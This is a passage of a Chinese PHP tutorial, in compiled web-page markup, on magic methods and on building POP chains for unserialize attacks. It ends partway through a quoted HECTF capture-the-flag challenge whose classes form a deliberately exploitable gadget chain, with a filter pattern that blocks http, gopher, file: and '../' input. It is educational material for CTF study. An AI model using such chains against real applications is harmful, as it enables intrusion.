important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"header"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Content-Type: text/html; charset=utf-8"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"  \n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"private")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__construct"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'""'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t\t\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__unset"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$content"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"当在类外面调用unset方法时，那么我就会执行！"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"isset"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$content"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t\t",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ameng")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Ameng"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"unset"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"执行结果："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200830174239.png",alt:null}))),Object(p.b)("h3",{className:"__internal",id:"tostring"},"toString()",Object(p.b)("a",c({parentName:"h3"},{href:"#tostring","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"此函数是将一个对象当作一个字符串来使用时，就会自动调用该方法，且在该方法中，可以返回一定的字符串，来表示该对象转换为字符串之后的结果。"),Object(p.b)("p",null,"通常情况下，我们访问类的属性的时候都是",Object(p.b)("inlineCode",{parentName:"p"},"$实例化名称->属性名"),"这样的格式去访问，但是我们不能直接echo去输出对象，可是当我们使用",Object(p.b)("inlineCode",{parentName:"p"},"__tostring()"),"就可以直接用echo来输出了。"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"header"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Content-Type: text/html; charset=utf-8"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"private")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$age"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__construct"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$age"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n            ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n            ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"age")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$age"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__toString"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n            ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"age")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'岁了'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ameng")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'Ameng'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"3"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"执行结果："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"text"},Object(p.b)("pre",c({parentName:"div"},{className:"language-text"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-text"}),"Ameng3岁了"))),Object(p.b)("h3",{className:"__internal",id:"__invoke"},"__invoke()",Object(p.b)("a",c({parentName:"h3"},{href:"#__invoke","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"当尝试以调用函数的方式调用一个对象时，",Object(p.b)("inlineCode",{parentName:"p"},"__invoke()"),"方法会被自动调用。"),Object(p.b)("p",null,"版本要求："),Object(p.b)("p",null,"PHP > 5.3.0"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"header"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Content-Type: text/html; charset=utf-8"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"private")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$age"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__construct"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$age"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n            ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"name")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$name"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n            ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"age")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$age"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__invoke"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n           ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'你用调用函数的方式调用了这个对象，所以我起作用了'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ameng")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"new")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'Ameng'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"3"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$ameng"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n执行结果——>\n你用调用函数的方式调用了这个对象，所以我起作用"))),Object(p.b)("h3",{className:"__internal",id:"pop链的构造"},"pop链的构造",Object(p.b)("a",c({parentName:"h3"},{href:"#pop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h3",{className:"__internal",id:"思路"},"思路",Object(p.b)("a",c({parentName:"h3"},{href:"#%E6%80%9D%E8%B7%AF","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ol",null,Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"寻找位点（unserialize函数—>变量可控）"),Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"正向构造（各种方法）"),Object(p.b)("li",c({parentName:"ol"},{className:"__internal"}),"反向推理（从要完成的目的出发，反向推理，最后找到最先被调用的位置处）")),Object(p.b)("p",null,"来看一个简单的例子(HECTF)："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Read")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$var"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$token"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$token_flag"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__construct"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{")," \n         ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"token_flag")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"token")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"md5"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"10000"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n         ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"token")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"&"),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"token_flag"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__invoke"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"token_flag")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"md5"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"rand"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"10000"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        \n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"token")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"===")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"token_flag"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n            ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"flag{**********}"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"class")," ",Object(p.b)("span",c({parentName:"span"},{className:"token class-name"}),"Show"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$source"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__construct"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"source"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"<br>"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__toString"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"str"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'str'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"source"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"public")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"__wakeup"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"preg_match"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"/http|https|file:|gopher|dict|\\.\\./i"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$this"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"-"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token property"}),"source"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n            ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," 